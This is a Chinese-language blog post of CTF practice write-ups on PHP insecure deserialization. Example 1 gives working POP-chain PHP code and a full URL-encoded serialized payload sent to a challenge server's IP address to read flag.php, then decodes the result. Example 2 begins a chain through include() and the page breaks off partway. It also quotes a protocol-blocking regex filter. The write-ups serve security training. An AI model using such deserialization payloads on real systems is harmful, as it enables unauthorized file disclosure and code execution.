

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">

  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
  <link rel="icon" href="/img/fluid.png">
  

  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="John Doe">
  <meta name="keywords" content="">
  
    <meta name="description" content="题目练习例题1：http:&#x2F;&#x2F;122.114.252.87:1110&#x2F;index2.php 解法1： 非预期解，手工调用第一步首先把网页上源代码复制下来 删除没用的 注释方法 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606">
<meta property="og:type" content="article">
<meta property="og:title" content="反序列化题目练习">
<meta property="og:url" content="http://example.com/2024/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AF%A6%E8%A7%A3/%E9%A2%98%E7%9B%AE%E7%BB%83%E4%B9%A0/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:description" content="题目练习例题1：http:&#x2F;&#x2F;122.114.252.87:1110&#x2F;index2.php 解法1： 非预期解，手工调用第一步首先把网页上源代码复制下来 删除没用的 注释方法 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://example.com/.com//17476536468948387717240924382119-20250519192047-ij0gmrz.png">
<meta property="og:image" content="http://example.com/.com//17476562901048388660158913969350-20250519200450-p2hilyc.png">
<meta property="og:image" content="http://example.com/.com//17476563861268689087422098348706-20250519200627-pcvbx9z.png">
<meta property="og:image" content="http://example.com/.com//17476564501344612018797667358221-20250519200730-fs681v3.png">
<meta property="og:image" content="http://example.com/.com//17476565097171150640440786115888-20250519200830-rrjxtqt.png">
<meta property="og:image" content="http://example.com/.com//17476565317604900775680869431296-20250519200852-08dr7rx.png">
<meta property="og:image" content="http://example.com/.com//17476574315877288923840810046356-20250519202352-rzwpee6.png">
<meta property="og:image" content="http://example.com/.com//17476580781468024852844359025089-20250519203439-s946w93.png">
<meta property="og:image" content="http://example.com/.com//17476581091664899805473643872117-20250519203510-1ovs32j.png">
<meta property="og:image" content="http://example.com/.com//17476581185514129733610710164602-20250519203519-4vcfew4.png">
<meta property="og:image" content="http://example.com/.com//17476582446048249458991917343755-20250519203725-ec9ermw.png">
<meta property="og:image" content="http://example.com/.com//17476582583645402199081299806411-20250519203739-x9hipvl.png">
<meta property="og:image" content="http://example.com/.com//17476582766138360737958902537856-20250519203759-qo996jy.png">
<meta property="og:image" content="http://example.com/.com//1747658344956718479055138235582-20250519203906-jvepfqt.png">
<meta property="og:image" content="http://example.com/.com//17476583692577796986138384772586-20250519203930-ih4wpf3.png">
<meta property="article:published_time" content="2024-05-19T16:00:00.000Z">
<meta property="article:modified_time" content="2025-05-20T09:18:49.401Z">
<meta property="article:author" content="John Doe">
<meta property="article:tag" content="PHP">
<meta property="article:tag" content="反序列化">
<meta property="article:tag" content="CTF题目">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="http://example.com/.com//17476536468948387717240924382119-20250519192047-ij0gmrz.png">
  
  
  
  <title>反序列化题目练习 - Hexo</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">



<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/image/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  


  
<meta name="generator" content="Hexo 7.3.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>我的博客</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/" target="_self">
                <i class="iconfont icon-home-fill"></i>
                <span>首页</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/" target="_self">
                <i class="iconfont icon-archive-fill"></i>
                <span>归档</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/" target="_self">
                <i class="iconfont icon-category-fill"></i>
                <span>分类</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/" target="_self">
                <i class="iconfont icon-tags-fill"></i>
                <span>标签</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/" target="_self">
                <i class="iconfont icon-user-fill"></i>
                <span>关于</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/links/" target="_self">
                <i class="iconfont icon-link-fill"></i>
                <span>友链</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/image/default.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="反序列化题目练习"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2024-05-20 00:00" pubdate>
          星期一, 五月 20日 2024, 12:00 凌晨
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          <!-- compatible with older versions-->
          9.3k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          <!-- compatible with older versions-->
          78 分钟
        
      </span>
    

    
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <h1 id="seo-header">反序列化题目练习</h1>
            
            
              <div class="markdown-body">
                
                <h1 id="题目练习"><a href="#题目练习" class="headerlink" title="题目练习"></a>题目练习</h1><h2 id="例题1："><a href="#例题1：" class="headerlink" title="例题1："></a>例题1：</h2><p><a target="_blank" rel="noopener" href="http://122.114.252.87:1110/index2.php">http://122.114.252.87:1110/index2.php</a></p>
<h4 id="解法1：-非预期解，手工调用"><a href="#解法1：-非预期解，手工调用" class="headerlink" title="解法1： 非预期解，手工调用"></a>解法1： 非预期解，手工调用</h4><p>第一步首先把网页上源代码复制下来 删除没用的 注释方法</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Read</span> </span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-comment">// public function get_file($value)</span><br>    <span class="hljs-comment">// &#123;</span><br>    <span class="hljs-comment">//     $text = base64_encode(file_get_contents($value));</span><br>    <span class="hljs-comment">//     return $text;</span><br>    <span class="hljs-comment">// &#125;</span><br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Show</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$source</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$class1</span>;<br>    <span class="hljs-comment">// public function __construct($name=&#x27;index.php&#x27;)</span><br>    <span class="hljs-comment">// &#123;</span><br>    <span class="hljs-comment">//     $this-&gt;source = $name;</span><br>    <span class="hljs-comment">//     echo $this-&gt;source.&#x27; Welcome&#x27;.&quot;&lt;br&gt;&quot;;    </span><br>    <span class="hljs-comment">// &#125;</span><br>    <span class="hljs-comment">//关键点  会读取文件内容  我们的目标就是读取flag.php里面的内容</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;   <br>        <span class="hljs-variable">$content</span> = <span class="hljs-variable language_">$this</span>-&gt;class1-&gt;<span class="hljs-title function_ invoke__">get_file</span>(<span class="hljs-variable">$this</span>-&gt;<span class="hljs-keyword">var</span>);<br>        <span class="hljs-comment">//  因为get_file方法在Read中所有class1一定是Read的一个实例化对象</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$content</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$content</span>;<br>    &#125;<br> <br>    <span class="hljs-comment">// public function _show()</span><br>    <span class="hljs-comment">// &#123;</span><br>    <span class="hljs-comment">//     if(preg_match(&#x27;/gopher|http|ftp|https|dict|\.\.|flag|file/i&#x27;,$this-&gt;source)) &#123;</span><br>    <span class="hljs-comment">//         die(&#x27;hacker&#x27;);</span><br>    <span class="hljs-comment">//     &#125; else &#123;</span><br>    <span class="hljs-comment">//         highlight_file($this-&gt;source);</span><br>    <span class="hljs-comment">//     &#125;</span><br><br>    <span class="hljs-comment">// &#125;</span><br> <br>    <span class="hljs-comment">// public function Change()</span><br>    <span class="hljs-comment">// &#123;</span><br>    <span class="hljs-comment">//     if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;, $this-&gt;source)) &#123;</span><br>    <span class="hljs-comment">//         echo &quot;hacker&quot;;</span><br>    <span class="hljs-comment">//     &#125;</span><br>    <span class="hljs-comment">// &#125;</span><br>    <span class="hljs-comment">// public function __get($key)&#123;</span><br>    <span class="hljs-comment">//     $function=$this-&gt;$key;</span><br>    <span class="hljs-comment">//     $this-&gt;&#123;$key&#125;();</span><br>    <span class="hljs-comment">// &#125;</span><br>&#125;<br><span class="hljs-comment">// if(isset($_GET[&#x27;sid&#x27;]))</span><br><span class="hljs-comment">// &#123;</span><br><span class="hljs-comment">//     $sid=$_GET[&#x27;sid&#x27;];</span><br><span class="hljs-comment">//     $config=unserialize($_GET[&#x27;config&#x27;]);</span><br><span class="hljs-comment">//     $config-&gt;$sid;</span><br><span class="hljs-comment">// &#125;</span><br><span class="hljs-comment">// else</span><br><span class="hljs-comment">// &#123;</span><br><span class="hljs-comment">//     $show = new Show(&#x27;index2.php&#x27;);</span><br><span class="hljs-comment">//     $show-&gt;_show();</span><br><span class="hljs-comment">// &#125;</span><br><br><span class="hljs-variable">$s</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Show</span>();<br><span class="hljs-variable">$s</span> -&gt; <span class="hljs-keyword">var</span> = <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br><br><span class="hljs-variable">$r</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Read</span>();<br><span class="hljs-variable">$s</span> -&gt; class1 = <span class="hljs-variable">$r</span>;<br><br><span class="hljs-keyword">echo</span>(<span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$s</span>)));<br></code></pre></td></tr></table></figure>

<p>非预期可以直接通过参数sid手动调用__toString方法而不是使用魔术方法 注意调用时不要加括号</p>
<p>输入</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">http:<span class="hljs-comment">//122.114.252.87:1110/index2.php?config=O%3A4%3A%22Show%22%3A3%3A%7Bs%3A6%3A%22source%22%3BN%3Bs%3A3%3A%22var%22%3Bs%3A8%3A%22flag.php%22%3Bs%3A6%3A%22class1%22%3BO%3A4%3A%22Read%22%3A0%3A%7B%7D%7D&amp;sid=__toString</span><br></code></pre></td></tr></table></figure>

<p>得到base64编码的字符串</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">PD9waHAKJGZsYWcgPSAiZmxhZ3syNTZkN2ZkNi1kYjUxLTQ0YjktOGIyZC04OGUxN2IwODg2ZTl9IjsKPz4=<br></code></pre></td></tr></table></figure>

<p>进行解密</p>
<p><img src="/.com//17476536468948387717240924382119-20250519192047-ij0gmrz.png" srcset="/image/loading.gif" lazyload alt="17476536468948387717240924382119"></p>
<p>成功得到flag！</p>
<h4 id="解法2：利用魔术方法调用-toString方法"><a href="#解法2：利用魔术方法调用-toString方法" class="headerlink" title="解法2：利用魔术方法调用__toString方法"></a>解法2：利用魔术方法调用__toString方法</h4><blockquote>
<p>__toString() 		   &#x2F;&#x2F;把类当作字符串使用时触发</p>
</blockquote>
<p>在正则表达式中把类当做了字符串</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Read</span> </span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-comment">// public function get_file($value)</span><br>    <span class="hljs-comment">// &#123;</span><br>    <span class="hljs-comment">//     $text = base64_encode(file_get_contents($value));</span><br>    <span class="hljs-comment">//     return $text;</span><br>    <span class="hljs-comment">// &#125;</span><br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Show</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$source</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$class1</span>;<br>    <span class="hljs-comment">// public function __construct($name=&#x27;index.php&#x27;)</span><br>    <span class="hljs-comment">// &#123;</span><br>    <span class="hljs-comment">//     $this-&gt;source = $name;</span><br>    <span class="hljs-comment">//     echo $this-&gt;source.&#x27; Welcome&#x27;.&quot;&lt;br&gt;&quot;;    </span><br>    <span class="hljs-comment">// &#125;</span><br>    <span class="hljs-comment">//关键点  会读取文件内容  我们的目标就是读取flag.php里面的内容</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;   <br>        <span class="hljs-variable">$content</span> = <span class="hljs-variable language_">$this</span>-&gt;class1-&gt;<span class="hljs-title function_ invoke__">get_file</span>(<span class="hljs-variable">$this</span>-&gt;<span class="hljs-keyword">var</span>);<br>        <span class="hljs-comment">//  因为get_file方法在Read中所有class1一定是Read的一个实例化对象</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$content</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$content</span>;<br>    &#125;<br> <br>    <span class="hljs-comment">// public function _show()</span><br>    <span class="hljs-comment">// &#123;</span><br>    <span class="hljs-comment">//     if(preg_match(&#x27;/gopher|http|ftp|https|dict|\.\.|flag|file/i&#x27;,$this-&gt;source)) &#123;</span><br>    <span class="hljs-comment">//         die(&#x27;hacker&#x27;);</span><br>    <span class="hljs-comment">//     &#125; else &#123;</span><br>    <span class="hljs-comment">//         highlight_file($this-&gt;source);</span><br>    <span class="hljs-comment">//     &#125;</span><br><br>    <span class="hljs-comment">// &#125;</span><br> <br>    <span class="hljs-comment">// public function Change()</span><br>    <span class="hljs-comment">// &#123;</span><br>    <span class="hljs-comment">//     if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;, $this-&gt;source)) &#123;</span><br>    <span class="hljs-comment">//         echo &quot;hacker&quot;;</span><br>    <span class="hljs-comment">//     &#125;</span><br>    <span class="hljs-comment">// &#125;</span><br>    <span class="hljs-comment">// public function __get($key)&#123;</span><br>    <span class="hljs-comment">//     $function=$this-&gt;$key;</span><br>    <span class="hljs-comment">//     $this-&gt;&#123;$key&#125;();</span><br>    <span class="hljs-comment">// &#125;</span><br>&#125;<br><span class="hljs-comment">// if(isset($_GET[&#x27;sid&#x27;]))</span><br><span class="hljs-comment">// &#123;</span><br><span class="hljs-comment">//     $sid=$_GET[&#x27;sid&#x27;];</span><br><span class="hljs-comment">//     $config=unserialize($_GET[&#x27;config&#x27;]);</span><br><span class="hljs-comment">//     $config-&gt;$sid;</span><br><span class="hljs-comment">// &#125;</span><br><span class="hljs-comment">// else</span><br><span class="hljs-comment">// &#123;</span><br><span class="hljs-comment">//     $show = new Show(&#x27;index2.php&#x27;);</span><br><span class="hljs-comment">//     $show-&gt;_show();</span><br><span class="hljs-comment">// &#125;</span><br><br><span class="hljs-comment">//倒着写的 这个是终点</span><br><span class="hljs-variable">$r</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Read</span>();<br><br><span class="hljs-variable">$s</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Show</span>();<br><span class="hljs-variable">$s</span> -&gt; <span class="hljs-keyword">var</span> = <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br><span class="hljs-variable">$s</span> -&gt; class1 = <span class="hljs-variable">$r</span>;<br><br><span class="hljs-variable">$s2</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Show</span>();<br><span class="hljs-variable">$s2</span> -&gt; source = <span class="hljs-variable">$s</span>;<br><br><span class="hljs-keyword">echo</span>(<span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$s2</span>)));  <span class="hljs-comment">//最后是对起点进行序列化</span><br></code></pre></td></tr></table></figure>

<p>一定要注意好&#x3D;&#x3D;s和s2&#x3D;&#x3D;的区别，首先肯定是对s2进行序列化 然后sid中执行字符串匹配的方法，</p>
<p>当通过&#x3D;&#x3D;s2去调用source&#x3D;&#x3D;的时候，因为source里面是&#x3D;&#x3D;类的对象&#x3D;&#x3D;，这个时候该&#x3D;&#x3D;对象也会执行&#x3D;&#x3D;，相当于去把&#x3D;&#x3D;s这个类对象&#x3D;&#x3D;，当做&#x3D;&#x3D;字符串去匹配正则表达式&#x3D;&#x3D;的时候，触发了&#x3D;&#x3D;s的toString方法&#x3D;&#x3D;，与&#x3D;&#x3D;s2没有关系，s2只是一个存放s的入口&#x3D;&#x3D;。</p>
<p>此外当sid为&#x3D;&#x3D;_show&#x3D;&#x3D;的时候会出现&#x3D;&#x3D;两次加密字符串&#x3D;&#x3D;是因为触发了：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">else</span> &#123;<br>     <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-variable">$this</span>-&gt;source);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>因为$this -&gt; source的结果就是编码字符串</p>
<p>然后还有一进入正则表达式的方法时就调用了一次</p>
<p>所以一共显示了两次</p>
<p>解密后成功得到flag！</p>
<hr>
<h2 id="例题2："><a href="#例题2：" class="headerlink" title="例题2："></a>例题2：</h2><p><a target="_blank" rel="noopener" href="http://122.114.252.87:1110/index3.php">http://122.114.252.87:1110/index3.php</a></p>
<h6 id="题目："><a href="#题目：" class="headerlink" title="题目："></a>题目：</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs php">index3.php You are in my range!<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Vox</span></span>&#123;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$headset</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$sound</span>;<br>    <span class="hljs-comment">//考虑fun函数作为最终的利用点</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">fun</span>(<span class="hljs-params"><span class="hljs-variable">$pulse</span></span>)</span>&#123;<br>            <span class="hljs-comment">//include！！！！危险函数 文件包含 通过文件流 伪协议 base64 读取flag.php文件</span><br>                <span class="hljs-keyword">include</span>(<span class="hljs-variable">$pulse</span>);<br>        &#125;<br>    <span class="hljs-comment">//调用invoke魔术方法  对象作为函数时触发 找用小括号的地方</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>                <span class="hljs-comment">//这里可以调用fun函数</span><br>                <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">fun</span>(<span class="hljs-variable">$this</span>-&gt;headset);<br>        &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Saw</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$fearless</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$gun</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$file</span>=<span class="hljs-string">&#x27;index.php&#x27;</span></span>)</span>&#123;<span class="hljs-comment">#创造对象时自动调用</span><br>                <span class="hljs-variable language_">$this</span>-&gt;fearless = <span class="hljs-variable">$file</span>;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;fearless . <span class="hljs-string">&#x27; You are in my range!&#x27;</span>.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>        &#125;<br>       <span class="hljs-comment">//对象视为字符串触发 定位到正则匹配</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-comment">//把gun设置为Petal的对象访问fearless 属于不存在属性</span><br>            <span class="hljs-comment">//需要注意的是gun设定为一个数组了 其中有一个键值为&#x27;gun&#x27; 所以给该键值进行相应赋值value gun = array(&quot;gun&quot; 